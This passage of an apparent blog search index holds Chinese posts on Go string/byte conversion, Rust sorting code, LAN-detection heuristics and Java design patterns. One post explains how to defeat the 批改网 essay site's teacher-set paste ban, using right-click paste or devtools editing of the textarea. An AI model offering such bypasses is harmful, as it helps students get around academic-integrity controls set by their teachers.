就是copy实现的核心方法，在汇编层面实现\u0026nbsp;源文件为memmove_*.s）\n24\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;memmove(unsafe.Pointer(\u0026amp;to[0]),\u0026nbsp;stringStructOf(\u0026amp;fm).str,\u0026nbsp;uintptr(n))\n25\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;n\n26}\ncopy实现过程图解如下\nstring([]byte)的实现（源码也在src/runtime/string.go中）\n1//\u0026nbsp;Buf\u0026nbsp;is\u0026nbsp;a\u0026nbsp;fixed-size\u0026nbsp;buffer\u0026nbsp;for\u0026nbsp;the\u0026nbsp;result,\n2//\u0026nbsp;it\u0026nbsp;is\u0026nbsp;not\u0026nbsp;nil\u0026nbsp;if\u0026nbsp;the\u0026nbsp;result\u0026nbsp;does\u0026nbsp;not\u0026nbsp;escape.\n3func\u0026nbsp;slicebytetostring(buf\u0026nbsp;*tmpBuf,\u0026nbsp;b\u0026nbsp;[]byte)\u0026nbsp;(str\u0026nbsp;string)\u0026nbsp;{\n4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;l\u0026nbsp;:=\u0026nbsp;len(b)\n5\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;l\u0026nbsp;==\u0026nbsp;0\u0026nbsp;{\n6\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;Turns\u0026nbsp;out\u0026nbsp;to\u0026nbsp;be\u0026nbsp;a\u0026nbsp;relatively\u0026nbsp;common\u0026nbsp;case.\n7\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;Consider\u0026nbsp;that\u0026nbsp;you\u0026nbsp;want\u0026nbsp;to\u0026nbsp;parse\u0026nbsp;out\u0026nbsp;data\u0026nbsp;between\u0026nbsp;parens\u0026nbsp;in\u0026nbsp;\"foo()bar\",\n8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;you\u0026nbsp;find\u0026nbsp;the\u0026nbsp;indices\u0026nbsp;and\u0026nbsp;convert\u0026nbsp;the\u0026nbsp;subslice\u0026nbsp;to\u0026nbsp;string.\n9\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;\"\"\n10\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n11\u0026nbsp;\u0026nbsp;//\u0026nbsp;如果开启了竞态检测\u0026nbsp;-race\n12\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;raceenabled\u0026nbsp;{\n13\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;racereadrangepc(unsafe.Pointer(\u0026amp;b[0]),\n14\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;uintptr(l),\n15\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;getcallerpc(),\n16\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;funcPC(slicebytetostring))\n17\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n18\u0026nbsp;\u0026nbsp;//\u0026nbsp;如果开启了memory\u0026nbsp;sanitizer\u0026nbsp;-msan\n19\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;msanenabled\u0026nbsp;{\n20\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;msanread(unsafe.Pointer(\u0026amp;b[0]),\u0026nbsp;uintptr(l))\n21\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n22\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;l\u0026nbsp;==\u0026nbsp;1\u0026nbsp;{\n23\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;stringStructOf(\u0026amp;str).str\u0026nbsp;=\u0026nbsp;unsafe.Pointer(\u0026amp;staticbytes[b[0]])\n24\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;stringStructOf(\u0026amp;str).len\u0026nbsp;=\u0026nbsp;1\n25\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\n26\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n27\n28\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;p\u0026nbsp;unsafe.Pointer\n29\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;buf\u0026nbsp;!=\u0026nbsp;nil\u0026nbsp;\u0026amp;\u0026amp;\u0026nbsp;len(b)\u0026nbsp;\u0026lt;=\u0026nbsp;len(buf)\u0026nbsp;{\n30\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;p\u0026nbsp;=\u0026nbsp;unsafe.Pointer(buf)\n31\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u0026nbsp;else\u0026nbsp;{\n32\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;p\u0026nbsp;=\u0026nbsp;mallocgc(uintptr(len(b)),\u0026nbsp;nil,\u0026nbsp;false)\n33\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n34\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;stringStructOf(\u0026amp;str).str\u0026nbsp;=\u0026nbsp;p\n35\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;stringStructOf(\u0026amp;str).len\u0026nbsp;=\u0026nbsp;len(b)\n36\u0026nbsp;\u0026nbsp;//\u0026nbsp;拷贝字节数组至字符串\n37\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;memmove(p,\u0026nbsp;(*(*slice)(unsafe.Pointer(\u0026amp;b))).array,\u0026nbsp;uintptr(len(b)))\n38\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\n39}\n40\n41//\u0026nbsp;实例stringStruct对象\n42func\u0026nbsp;stringStructOf(sp\u0026nbsp;*string)\u0026nbsp;*stringStruct\u0026nbsp;{\n43\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;(*stringStruct)(unsafe.Pointer(sp))\n44}\n可见，当数组长度超过32时，同样需要调用mallocgc分配一块新内存。最后通过memmove完成拷贝。强转换的实现细节1. 万能的unsafe.Pointer指针在go中，任何类型的指针*T都可以转换为unsafe.Pointer类型的指针，它可以存储任何变量的地址。同时，unsafe.Pointer类型的指针也可以转换回普通指针，而且可以不必和之前的类型*T相同。另外，unsafe.Pointer类型还可以转换为uintptr类型，该类型保存了指针所指向地址的数值，从而可以使我们对地址进行数值计算。以上就是强转换方式的实现依据。而string和slice在reflect包中，对应的结构体是reflect.StringHeader和reflect.SliceHeader，它们是string和slice的运行时表达。 1type\u0026nbsp;StringHeader\u0026nbsp;struct\u0026nbsp;{\n2\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Data\u0026nbsp;uintptr\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Len\u0026nbsp;\u0026nbsp;int\n4}\n5\n6type\u0026nbsp;SliceHeader\u0026nbsp;struct\u0026nbsp;{\n7\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Data\u0026nbsp;uintptr\n8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Len\u0026nbsp;\u0026nbsp;int\n9\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Cap\u0026nbsp;\u0026nbsp;int\n10}\n2. 内存布局\n从string和slice的运行时表达可以看出，除了SilceHeader多了一个int类型的Cap字段，Date和Len字段是一致的。所以，它们的内存布局是可对齐的，这说明我们就可以直接通过unsafe.Pointer进行转换。[]byte转string图解string转[]byte图解\nQ\u0026amp;A\nQ1.为什么强转换性能会比标准转换好？对于标准转换，无论是从[]byte转string还是string转[]byte都会涉及底层数组的拷贝。而强转换是直接替换指针的指向，从而使得string和[]byte指向同一个底层数组。这样，当然后者的性能会更好。\nQ2.为什么在上述测试中，当x的数据较大时，标准转换方式会有一次分配内存的操作，从而导致其性能更差，而强转换方式却不受影响？标准转换时，当数据长度大于32个字节时，需要通过mallocgc申请新的内存，之后再进行数据拷贝工作。而强转换只是更改指针指向。所以，当转换数据较大时，两者性能差距会愈加明显。\nQ3.既然强转换方式性能这么好，为什么go语言提供给我们使用的是标准转换方式？首先，我们需要知道Go是一门类型安全的语言，而安全的代价就是性能的妥协。但是，性能的对比是相对的，这点性能的妥协对于现在的机器而言微乎其微。另外强转换的方式，会给我们的程序带来极大的安全隐患。如下示例1a\u0026nbsp;:=\u0026nbsp;\"hello\"\n2b\u0026nbsp;:=\u0026nbsp;String2Bytes(a)\n3b[0]\u0026nbsp;=\u0026nbsp;'H'\na是string类型，前面我们讲到它的值是不可修改的。通过强转换将a的底层数组赋给b，而b是一个[]byte类型，它的值是可以修改的，所以这时对底层数组的值进行修改，将会造成严重的错误（通过defer+recover也不能捕获）。\n1unexpected\u0026nbsp;fault\u0026nbsp;address\u0026nbsp;0x10b6139\n2fatal\u0026nbsp;error:\u0026nbsp;fault\n3[signal\u0026nbsp;SIGBUS:\u0026nbsp;bus\u0026nbsp;error\u0026nbsp;code=0x2\u0026nbsp;addr=0x10b6139\u0026nbsp;pc=0x1088f2c]\nQ4. 为什么string要设计为不可修改？我认为有必要思考一下该问题。string不可修改，意味它是只读属性，这样的好处就是：在并发场景下，我们可以在不加锁的控制下，多次使用同一字符串，在保证高效共享的情况下而不用担心安全问题。\n取舍场景在你不确定安全隐患的条件下，尽量采用标准方式进行数据转换。\n当程序对运行性能有高要求，同时满足对数据仅仅只有读操作的条件，且存在频繁转换（例如消息转发场景），可以使用强转换。\n推荐阅读\n深挖Go系列之string那些事\n福利\n我为大家整理了一份从入门到进阶的Go学习资料礼包（下图只是部分），同时还包含学习建议：入门看什么，进阶看什么。关注公众号 「polarisxu」，回复\u0026nbsp;ebook\u0026nbsp;获取；还可以回复「进群」，和数万 Gopher 交流学习。\n预览时标签不可点 喜欢此内容的人还喜欢 一本广受好评的 Go 新书：Go语言学习指南 一本广受好评的 Go 新书：Go语言学习指南 ... Go语言中文网 不喜欢 微信扫一扫\n关注该公众号\n： ， 。 \u0026nbsp; 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%87%82string%E4%B8%8Ebyte%E7%9A%84%E8%BD%AC%E6%8D%A2%E4%BA%86%E5%90%97-2022_6_16-09_49_20/","title":"你真的懂string与[]byte的转换了吗 (2022_6_16 09_49_20)"},{"content":"排序算法实现 原理讲解：https://algo.itcharge.cn/01.Array/02.Array-Sort/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 use std::cmp::min; // 选择排序 fn select_sort(arr: \u0026amp;mut [i32]) { let n = arr.len(); for i in 0..n { let mut min_index = i; for j in i + 1..n { if arr[min_index] \u0026gt; arr[j] { min_index = j; } } if min_index != i { (arr[i], arr[min_index]) = (arr[min_index], arr[i]); } } } // 冒泡排序 fn bubble_sort(arr: \u0026amp;mut [i32]) { let n = arr.len(); for i in 0..n { for j in i + 1..n { if arr[i] \u0026gt; arr[j] { (arr[i], arr[j]) = (arr[j], arr[i]) } } } } // 插入排序 fn insert_sort(arr: \u0026amp;mut [i32]) { let n = arr.len(); for i in 1..n { let temp = arr[i]; let mut j = i; while j \u0026gt; 0 \u0026amp;\u0026amp; arr[j - 1] \u0026gt; temp { arr[j] = arr[j - 1]; j -= 1; } arr[j] = temp; } } // 希尔排序 fn shell_sort(arr: \u0026amp;mut [i32]) { let n = arr.len(); let mut gap = n / 2; while gap \u0026gt; 0 { for i in gap..n { let temp = arr[i]; let mut j = i; while j \u0026gt;= gap \u0026amp;\u0026amp; arr[j - gap] \u0026gt; temp { arr[j] = arr[j - gap]; j -= gap; } arr[j] = temp; } gap = gap / 2; } } // 归并排序（循环版本） fn merge_sort_loop(arr: \u0026amp;mut [i32]) { let n = arr.len(); if n == 1 { return; } let mut size = 1; while size \u0026lt; n { for left in (0..n).step_by(2 * size) { let mid = min(left + size, n); let right = min(left + 2 * size, n); merge_loop(arr, left, mid, right); } size *= 2; } } fn merge_loop(arr: \u0026amp;mut [i32], left: usize, mid: usize, right: usize) { let mut temp = vec![0; right - left]; let (mut i, mut j, mut k) = (left, mid, 0); while i \u0026lt; mid \u0026amp;\u0026amp; j \u0026lt; right { if arr[i] \u0026lt;= arr[j] { temp[k] = arr[i]; i += 1; } else { temp[k] = arr[j]; j += 1; } k += 1; } while i \u0026lt; mid { temp[k] = arr[i]; k += 1; i += 1; } while j \u0026lt; right { temp[k] = arr[j]; k += 1; j += 1; } for i in 0..temp.len() { arr[left + i] = temp[i]; } } // 归并排序（递归版本） fn merge_sort_recursion(arr: \u0026amp;mut [i32]) { fn sort_help(arr: \u0026amp;mut [i32], left: usize, right: usize) { if right - left \u0026lt;= 1 { return; } let mid = (left + right) / 2; sort_help(arr, left, mid); sort_help(arr, mid, right); merge_recursion(arr, left, mid, right); } sort_help(arr, 0, arr.len()) } fn merge_recursion(arr: \u0026amp;mut [i32], left: usize, mid: usize, right: usize) { let left_part = arr[left..mid].to_vec(); let right_part = arr[mid..right].to_vec(); let (mut i, mut j, mut k) = (0, 0, left); while i \u0026lt; left_part.len() \u0026amp;\u0026amp; j \u0026lt; right_part.len() { if left_part[i] \u0026lt;= right_part[j] { arr[k] = left_part[i]; i += 1; } else { arr[k] = right_part[j]; j += 1; } k += 1; } while i \u0026lt; left_part.len() { arr[k] = left_part[i]; i += 1; k += 1; } while j \u0026lt; right_part.len() { arr[k] = right_part[j]; j += 1; k += 1; } } fn quick_sort_recursion(arr: \u0026amp;mut [i32]) { if arr.len() \u0026lt;= 1 { return; } let pivot_index = partition_recursion(arr); // 递归调用时直接对切片进行可变借用 quick_sort_recursion(\u0026amp;mut arr[..pivot_index]); quick_sort_recursion(\u0026amp;mut arr[pivot_index + 1..]); } fn partition_recursion(arr: \u0026amp;mut [i32]) -\u0026gt; usize { let pivot = arr[0]; let mut i = 1; for j in 1..arr.len() { if arr[j] \u0026lt; pivot { arr.swap(i, j); i += 1; } } arr.swap(0, i - 1); i - 1 } fn quick_sort_loop(arr: \u0026amp;mut [i32]) { let mut stack: Vec\u0026lt;(usize, usize)\u0026gt; = vec![(0, arr.len())]; while let Some((low, high)) = stack.pop() { if low \u0026lt; high { let pivot_index = partition_loop(arr, low, high); stack.push((low, pivot_index)); stack.push((pivot_index + 1, high)); } } } fn partition_loop(arr: \u0026amp;mut [i32], low: usize, high: usize) -\u0026gt; usize { let pivot = arr[low]; let mut left = low + 1; let mut right = high; loop { while left \u0026lt; high \u0026amp;\u0026amp; arr[left] \u0026lt;= pivot { left += 1; } while right \u0026gt; low \u0026amp;\u0026amp; arr[right - 1] \u0026gt;= pivot { right -= 1; } if left \u0026gt;= right { break; } else { arr.swap(left, right - 1); } } arr.swap(low, right - 1); right - 1 } #[cfg(test)] mod tests { use super::*; use rand::Rng; use std::time::Instant; // 定义排序函数的类型 type SortFn = fn(\u0026amp;mut [i32]); fn sorting_algorithms() -\u0026gt; Vec\u0026lt;(\u0026amp;\u0026#39;static str, SortFn)\u0026gt; { vec![ (\u0026#34;select_sort\u0026#34;, select_sort), (\u0026#34;bubble_sort\u0026#34;, bubble_sort), (\u0026#34;insert_sort\u0026#34;, insert_sort), (\u0026#34;shell_sort\u0026#34;, shell_sort), (\u0026#34;merge_sort_loop\u0026#34;, merge_sort_loop), (\u0026#34;merge_sort_recursion\u0026#34;, merge_sort_recursion), (\u0026#34;quick_sort_recursion\u0026#34;, quick_sort_recursion), // (\u0026#34;quick_sort_loop\u0026#34;, quick_sort_loop), ] } // 运行排序测试 fn run_sort_test(sort_fn: SortFn) { let mut vec1 = vec![64, 25, 12, 22, 11]; sort_fn(\u0026amp;mut vec1); assert_eq!(vec1, vec![11, 12, 22, 25, 64]); let mut vec2 = vec![5, 4, 3, 2, 1]; sort_fn(\u0026amp;mut vec2); assert_eq!(vec2, vec![1, 2, 3, 4, 5]); let mut vec3 = vec![1, 2, 3, 4, 5]; sort_fn(\u0026amp;mut vec3); assert_eq!(vec3, vec![1, 2, 3, 4, 5]); // Already sorted let mut vec4 = vec![]; sort_fn(\u0026amp;mut vec4); assert_eq!(vec4, vec![]); // Empty vector let mut vec5 = vec![42]; sort_fn(\u0026amp;mut vec5); assert_eq!(vec5, vec![42]); // Single element } #[test] fn correct_test() { for \u0026amp;(_, sort_fn) in sorting_algorithms().iter() { run_sort_test(sort_fn); } } // 性能测试函数 fn run_performance_test( sort_fn: SortFn, name: \u0026amp;str, size: usize, ) -\u0026gt; (String, std::time::Duration) { let mut vec: Vec\u0026lt;i32\u0026gt; = (0..size) .map(|_| rand::rng().random_range(1..=size as i32)) .collect(); // 生成随机数组 let start = Instant::now(); sort_fn(\u0026amp;mut vec); let duration = start.elapsed(); (name.to_string(), duration) } #[test] fn performance_tests() { let sizes = [1000, 10000]; // 定义测试的大小 for \u0026amp;size in \u0026amp;sizes { println!(\u0026#34;Performance tests for size: {}\u0026#34;, size); let mut results = Vec::new(); // 运行每个排序函数并收集结果 for \u0026amp;(name, sort_fn) in sorting_algorithms().iter() { let mut total_duration = std::time::Duration::new(0, 0); // 进行三次测试 for _ in 0..3 { let (_, duration) = run_performance_test(sort_fn, name, size); total_duration += duration; } // 计算平均时间 let avg_duration = total_duration / 3; results.push((name.to_string(), avg_duration)); } // 按执行时间排序 results.sort_by(|a, b| a.1.cmp(\u0026amp;b.1)); // 输出排序结果 for (name, duration) in results { println!(\u0026#34;{} took {:?} to sort {} elements.\u0026#34;, name, duration, size); } } } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/","title":"排序算法实现"},{"content":"绕过批改网“禁止粘贴”限制 老师在布置批改网作文时一般会勾选上作文正文禁止粘贴的功能，想要绕过这个限制的话最好在浏览器打开网页版批改网进行写作。如果使用手机APP版的批改网的话想要绕过的话，就比较困难。 本文只讲解如何绕过网页版的限制！\n1. 右键复制粘贴 批改网网页的 JS 只是禁用键盘的 Ctrl+C 粘贴的功能，但是并未禁止鼠标右键。我们只需要将鼠标停留在输入框中，然后右键，选择粘贴功能就OK了。 2. 修改网页源代码 如果说批改网把鼠标右键也禁用了，那么我们就需要使出我们的终极绝招——修改网页源代码了！ 批改网再牛掰它也是网页，是由 html 语言书写的，我们修改网页源代码的话，它是没有丝毫办法的。\n在输入框鼠标右键，选择检查 找到 \u0026lt;textarea\u0026gt; 标签 右键选择 Edit as HTML进入网页代码编辑模式 在标签内存书写作文内容 点击其它区域，退出编辑模式 tips: 在退出之前最好先把作文内容保存，以免操作不当丢失内容 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%BB%95%E8%BF%87%E7%BD%91%E9%A1%B5%E7%89%88%E6%89%B9%E6%94%B9%E7%BD%91%E7%A6%81%E6%AD%A2%E7%B2%98%E8%B4%B4%E9%99%90%E5%88%B6/","title":"绕过网页版批改网“禁止粘贴”限制"},{"content":"局域网连接判断 一、局域网类型 1. 通过局域网 IP 直连 场景：客户端 A 与客户端 B 处于同一个路由器下。\n2. 通过公网 IPv6 直连 场景：客户端 A 与 客户端 B 处于同一个路由器下，路由器为客户端 A 与客户端 B 皆分配了公网 IP 地址。\n3. 单边位于 NAT 下 场景：客户端 A 位于路由器的局域网中，路由器与客户端 B 都位于光猫下。\n4. 双边位于 NAT 下 场景：光猫下有多个路由器，未做 mesh。客户端 A 与客户端 B 分别位于一个路由器下。\n5. 通过 ISP NAT 建立连接 场景：光猫 A 和光猫 B 都是同一个 ISP 运营商的设备。两个光猫无公网地址，只有 ISP 运营商分配到的 100.64.0.0 - 100.127.255.255 地址。\n6. 通过 VPN 网关建立连接 场景：双端通过 VPN 网关（例如 WireGuard、ZeroTire）构建了局域网。\n7. 通过 NAT 回环建立连接 场景：客户端 A 通过端口映射协议（例如UPnP）在路由器上增加 NAT 规则，并获取路由器 WAN 地址作为自身地址。客户端 B 通过路由器 WAN 地址与客户端 A 建立连接。\n二、判断方式 1. 通过 RFC 定义 当对端地址为以下类型时，可以直接判断为局域网：\n根据 RFC 1918 和 RFC 4193，10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, fc00::/7 地址为私网地址； 根据 RFC 3927 和 RFC 4291，169.254.0.0/16, fe80::/10 地址为 Link-Local 地址； 通过 RFC 定义，可以将 通过局域网 IP 直连 、单边位于 NAT 下、双边位于 NAT 正确识别为局域网连接。\n2. 计算子网 当在局域网通过其他类型地址建立连接时（如：Global Unicast IPv6 地址），通过获取本地网卡地址列表和对应子网掩码。\n通过计算子网判断对端地址是否和本地地址位于同一局域网。\n通过计算子网的方式，可以将 通过局域网 IP 直连 、单边位于 NAT 下、双边位于 NAT、通过公网 IPv6 直连 正确识别为局域网连接。\n3. 特殊场景 ISP 地址 当双端通过 ISP 地址建立局域网连接时，\n如果通过 ISP 地址建立的连接速率不受双端购买的套餐限制，则可以认为是局域网连接；\n如果建立的连接速率受双端购买的套餐限制，则不应认为是局域网连接。\nVPN 地址 在 Linux 端可以根据路由表来判断对端地址对应路由是否属于 VPN 网卡；\n但是在移动端无法直接拿到路由表，因此无法判断对端地址会不会经过 VPN 网卡。\nNAT 回环地址 当通过 NAT 回环地址建立连接后，双端看到的对端地址皆为 NAT WAN 口地址。\n此时有几种方式判断是否是位于同一局域网：\n双端交换自身看到的对端地址信息。如果一致则可以判断当前连接为通过 NAT 回环地址建立； 双端通过端口映射协议获取 NAT 网关的 External 地址。如果 NAT 网关地址与对端地址相同则可以判断当前连接为通过 NAT 回环地址建立； ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%BF%9E%E6%8E%A5%E5%8F%8C%E7%AB%AF%E4%BD%8D%E4%BA%8E%E5%90%8C%E4%B8%80%E5%B1%80%E5%9F%9F%E7%BD%91/","title":"如何判断连接双端位于同一局域网"},{"content":"设计模式——备忘录模式 一、基本概念 1. 定义 备忘录（Memento）模式：在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。该模式又叫快照模式。\n2. 优缺点 优点：\n提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态； 实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息； 简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。 缺点：\n资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。 3. 结构 发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息； 备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人； 管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。 二、代码实现 备忘录 负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package pers.designPattern.memento; public class Memento { private String state; public Memento(String state) { this.state = state; } public void setState(String state) { this.state = state; } public String getState() { return state; } } 发起人 记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package pers.designPattern.memento; public class Originator { private String state; public void setState(String state) { this.state = state; } public String getState() { return state; } public Memento createMemento() { return new Memento(state); } public void restoreMemento(Memento memento) { this.setState(memento.getState()); } } 管理者 对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.memento; public class Caretaker { private Memento memento; public void setMemento(Memento memento) { this.memento = memento; } public Memento getMemento() { return memento; } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.memento; public class MementoClient { public static void main(String[] args) { Originator originator = new Originator(); Caretaker caretaker = new Caretaker(); originator.setState(\u0026#34;S0\u0026#34;); System.out.println(\u0026#34;初始状态: \u0026#34; + originator.getState()); caretaker.setMemento(originator.createMemento()); originator.setState(\u0026#34;S1\u0026#34;); System.out.println(\u0026#34;新的状态: \u0026#34; + originator.getState()); originator.restoreMemento(caretaker.getMemento()); System.out.println(\u0026#34;恢复状态: \u0026#34; + originator.getState()); } } 运行结果：\n初始状态: S0 新的状态: S1 恢复状态: S0 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F/","title":"设计模式——备忘录模式"},{"content":"设计模式——策略模式 一、基本概念 1. 定义 策略（Strategy）模式：该模式定义了一系列算法，并将每个算法封装起来，使它们可以相互替换，且算法的变化不会影响使用算法的客户。策略模式属于对象行为模式，它通过对算法进行封装，把使用算法的责任和算法的实现分割开来，并委派给不同的对象对这些算法进行管理。\n策略模式是一种行为设计模式， 它能让你定义一系列算法， 并将每种算法分别放入独立的类中， 以使算法的对象能够相互替换。\n2. 优缺点 优点：\n多重条件语句不易维护，而使用策略模式可以避免使用多重条件语句，如 if\u0026hellip;else 语句、switch\u0026hellip;case 语句； 策略模式提供了一系列的可供重用的算法族，恰当使用继承可以把算法族的公共代码转移到父类里面，从而避免重复的代码； 策略模式可以提供相同行为的不同实现，客户可以根据不同时间或空间要求选择不同的； 策略模式提供了对开闭原则的完美支持，可以在不修改原代码的情况下，灵活增加新算法； 策略模式把算法的使用放到环境类中，而算法的实现移到具体策略类中，实现了二者的分离。 缺点：\n客户端必须理解所有策略算法的区别，以便适时选择恰当的算法类； 策略模式造成很多的策略类，增加维护难度。 3. 结构 抽象策略（Strategy）类：定义了一个公共接口，各种不同的算法以不同的方式实现这个接口，环境角色使用这个接口调用不同的算法，一般使用接口或抽象类实现； 具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现； 环境（Context）类：持有一个策略类的引用，最终给客户端调用。 二、代码实现 抽象策略类 定义了一个公共接口，各种不同的算法以不同的方式实现这个接口，环境角色使用这个接口调用不同的算法，一般使用接口或抽象类实现：\n1 2 3 4 5 package pers.designPattern.strategy; public interface Strategy { public void strategyMethod(); } 具体策略类 实现了抽象策略定义的接口，提供具体的算法实现：\n1 2 3 4 5 6 7 8 package pers.designPattern.strategy; public class ConcreteStrategyA implements Strategy { @Override public void strategyMethod() { System.out.println(\u0026#34;具体策略A被使用！\u0026#34;); } } 1 2 3 4 5 6 7 8 package pers.designPattern.strategy; public class ConcreteStrategyB implements Strategy { @Override public void strategyMethod() { 